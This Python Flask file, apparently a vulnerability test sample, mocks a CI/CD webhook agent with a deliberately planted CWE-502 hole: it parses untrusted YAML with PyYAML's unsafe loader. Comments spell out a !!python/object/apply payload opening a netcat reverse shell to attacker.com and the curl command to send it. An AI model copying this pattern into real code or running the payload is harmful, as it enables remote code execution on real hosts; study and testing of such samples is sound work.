import os
import yaml
import uuid
import sqlite3
import logging
import threading
from datetime import datetime
from flask import Flask, request, jsonify

# Configure logging for the CI/CD Pipeline Agent
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - BuildAgent - %(levelname)s - %(message)s'
)
logger = logging.getLogger("CI_CD_Agent")

app = Flask(__name__)
DB_FILE = "build_jobs.db"

def init_build_db():
    """Initializes the SQLite database for tracking CI/CD build jobs."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE builds (
            job_id TEXT PRIMARY KEY,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            repository TEXT NOT NULL,
            branch TEXT NOT NULL,
            status TEXT NOT NULL,
            details TEXT
        )
    ''')
    
    # Pre-populate with historical mock builds
    mock_builds = [
        ('job_a1b2c3', 'repo/auth-service', 'main', 'SUCCESS', 'Build completed and pushed to registry.'),
        ('job_d4e5f6', 'repo/frontend-ui', 'dev', 'FAILED', 'NPM install failed with exit code 1.')
    ]
    cursor.executemany('''
        INSERT INTO builds (job_id, repository, branch, status, details)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_builds)
    
    conn.commit()
    conn.close()
    logger.info("CI/CD build tracking database initialized.")

def update_build_status(job_id: str, status: str, details: str = ""):
    """Updates the status of an ongoing build job."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE builds SET status = ?, details = ? WHERE job_id = ?",
            (status, details, job_id)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error updating build {job_id}: {e}")

def parse_job_manifest(manifest_content: str, job_id: str) -> dict:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: Flask HTTP POST Body (Raw YAML payload)
    """
    logger.info(f"[{job_id}] Parsing incoming YAML build manifest.")
    
    try:
        # Vulnerability: The application uses the unsafe yaml.Loader to parse the YAML payload
        # provided directly by the user via the webhook POST body. PyYAML's default Loader
        # (or yaml.unsafe_load) allows the instantiation of arbitrary Python objects using
        # YAML tags like !!python/object/apply. An attacker can construct a malicious YAML
        # payload to execute arbitrary system commands upon deserialization.
        
        # CWE-502 occurs instantly during the load() operation.
        config = yaml.load(manifest_content, Loader=yaml.Loader)
        
        if isinstance(config, dict) and "build_steps" in config:
            logger.debug(f"[{job_id}] Manifest parsed successfully.")
            return config
        else:
            logger.warning(f"[{job_id}] Manifest does not contain required 'build_steps' key.")
            return None
            
    except yaml.YAMLError as e:
        logger.error(f"[{job_id}] YAML syntax error in manifest: {e}")
        return None
    except Exception as e:
        logger.error(f"[{job_id}] Unexpected error during manifest deserialization: {e}")
        return None

def background_builder(job_id: str, repository: str, config: dict):
    """Simulates the background execution of the parsed CI/CD build steps."""
    logger.info(f"[{job_id}] Starting build process for {repository}")
    update_build_status(job_id, "IN_PROGRESS", "Executing build steps...")
    
    steps = config.get("build_steps", [])
    for step in steps:
        step_name = step.get("name", "Unknown Step")
        logger.info(f"[{job_id}] Executing step: {step_name}")
        # In a real system, these steps would be executed in a sandboxed container.
        # For this mock, we just log them.
        
    logger.info(f"[{job_id}] Build completed successfully.")
    update_build_status(job_id, "SUCCESS", "All build steps executed without errors.")

@app.route('/api/v1/webhooks/gitlab', methods=['POST'])
def gitlab_webhook():
    """Endpoint to receive CI/CD trigger webhooks from GitLab."""
    
    # Extract the raw YAML payload from the POST request body
    manifest_content = request.get_data(as_text=True)
    if not manifest_content:
        return jsonify({"error": "Missing YAML payload in request body"}), 400
        
    repository = request.headers.get("X-Gitlab-Repository", "unknown/repo")
    branch = request.headers.get("X-Gitlab-Branch", "main")
    job_id = f"job_{uuid.uuid4().hex[:8]}"
    
    try:
        # Register the build in the database initially as QUEUED
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO builds (job_id, repository, branch, status, details) VALUES (?, ?, ?, ?, ?)",
            (job_id, repository, branch, 'QUEUED', 'Waiting for manifest parsing...')
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to record new build job: {e}")
        return jsonify({"error": "Internal database error"}), 500
        
    # Pass the untrusted raw HTTP body directly to the vulnerable deserialization function
    config = parse_job_manifest(manifest_content, job_id)
    
    if not config:
        update_build_status(job_id, "FAILED", "Invalid or malformed YAML manifest.")
        return jsonify({"error": "Failed to parse build manifest", "job_id": job_id}), 400
        
    # Dispatch the valid configuration to the background worker
    worker_thread = threading.Thread(
        target=background_builder, 
        args=(job_id, repository, config)
    )
    worker_thread.start()
    
    return jsonify({
        "message": "Webhook received. Build queued.",
        "job_id": job_id,
        "repository": repository
    }), 202

@app.route('/api/v1/builds/<job_id>', methods=['GET'])
def get_build_status(job_id):
    """Retrieves the status of a specific build job."""
    try:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM builds WHERE job_id = ?", (job_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify(dict(row)), 200
        else:
            return jsonify({"error": "Build job not found"}), 404
            
    except sqlite3.Error:
        return jsonify({"error": "Internal database error"}), 500

if __name__ == "__main__":
    init_build_db()
    
    logger.info("Starting CI/CD Build Agent on port 9000")
    
    # Example Malicious Trigger via cURL:
    # 1. Attacker crafts a malicious YAML payload using !!python/object/apply:
    #    payload = """
    #    build_steps:
    #      - name: "Compromise Agent"
    #        action: !!python/object/apply:os.system ["nc -e /bin/sh attacker.com 4444"]
    #    """
    # 2. Attacker sends the payload to the webhook endpoint:
    #    curl -X POST http://127.0.0.1:9000/api/v1/webhooks/gitlab \
    #         -H "Content-Type: application/x-yaml" \
    #         --data-binary @malicious.yaml
    
    app.run(host="0.0.0.0", port=9000, threaded=True)
